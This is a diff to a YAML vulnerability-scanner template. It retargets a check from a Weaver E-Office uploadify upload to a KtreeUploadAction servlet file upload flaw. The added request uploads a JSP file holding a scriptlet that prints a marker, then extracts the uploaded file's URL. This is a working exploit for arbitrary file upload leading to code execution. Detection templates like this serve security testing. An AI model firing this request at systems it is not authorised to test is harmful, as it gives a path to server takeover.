@@ -1,12 +1,12 @@
-id: 泛微E-Office v9.5文件上传
+id: 泛微E-Office KtreeUploadAction文件上传
 time: '2023-05-17'
 
 
 info:
-  name: 泛微E-Office v9.5文件上传
+  name: 泛微KtreeUploadAction
   severity: high
-  description: 泛微-EOffice,自定义函数doc2txt导致的任意文件上传
-  reference: https://github.com/sunyixuan1228/cve/blob/main/weaver.md
+  description: com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction 存在文件上传漏洞，攻击者可利用该漏洞获取系统权限
+  reference: 暂无
   metadata:
     max-request: 2
     verified: true
@@ -17,8 +17,8 @@ http:
       - POST
       - GET
     path:
-      - "{{BaseURL}}/inc/jquery/uploadify/uploadify.php"
-      - "{{BaseURL}}/attachment/path/uploadify.php"
+      - "{{BaseURL}}/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction/.css?action=image"
+      - "{{BaseURL}}/path"
 
     Rheader:
       - Content-Type:multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt & Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 & Accept-Encoding:gzip, deflate
@@ -26,10 +26,10 @@ http:
     body: 
       - |
         ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
-        Content-Disposition:form-data; name="Fdiledata"; filename="uploadify.php."
+        Content-Disposition: form-data; name="Fdiledata"; filename="uploadify.jsp"
         Content-Type:image/jpeg
         
-        Hello
+        <%out.println("hello2022 ! world2022");%>
         ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
 
       
@@ -39,7 +39,7 @@ http:
       - type: word
         part: body
         words:
-          - "Hello"
+          - "hello2022 ! world2022"
 
       - type: status
         status:
@@ -53,4 +53,4 @@ http:
         time: 
           - 1
         regex:
-          - '(.*)'
+          - "'url':'(.*)?','title':'','"
